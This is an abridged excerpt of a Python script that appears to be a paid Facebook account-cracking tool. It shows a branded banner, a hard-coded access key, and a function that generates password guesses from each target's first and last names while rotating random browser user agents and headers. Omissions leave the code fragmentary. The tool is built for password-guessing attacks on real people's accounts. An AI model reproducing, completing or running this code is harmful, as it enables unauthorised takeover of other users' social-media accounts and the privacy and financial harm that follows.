...
os.system('clear')
logo = ("""
\033[1;92m888    d8P  888      8888888 888b    888 88888888888 
\033[1;92m888   d8P   888        888   8888b   888     888     
\033[1;92m888  d8P    888        888   88888b  888     888     
\033[1;92m888d88K     888        888   888Y88b 888     888     
\033[1;92m8888888b    888        888   888 Y88b888     888     
\033[1;92m888  Y88b   888        888   888  Y88888     888     
\033[1;92m888   Y88b  888        888   888   Y8888     888     
\033[1;92m888    Y88b 88888888 8888888 888    Y888     888\033[1;92m
=================================================
 FACEBOOK : KLINT SLYX KAZUKI
 GITHUB : NOT FOUND
 TYPE OF TOOL : PAID
...
tokenku=[]
# LOGIN_KEY
correct_username = 'klint'
key = 'true'

while key == 'true':
    username = input('\33[0;97m[pogo]\33[1;96m~~~~~>\33[1;92mPLEASE ENTER KEY\33[1;91m: ')

    if username == correct_username:
        print('\33[1;37m-----------------------------------------------\33[0;97m[•]\33[1;32m WELCOME TO KLINT SLYX KAZUKI TOOL ')
        time.sleep(1)
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        headers_freefb = {'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
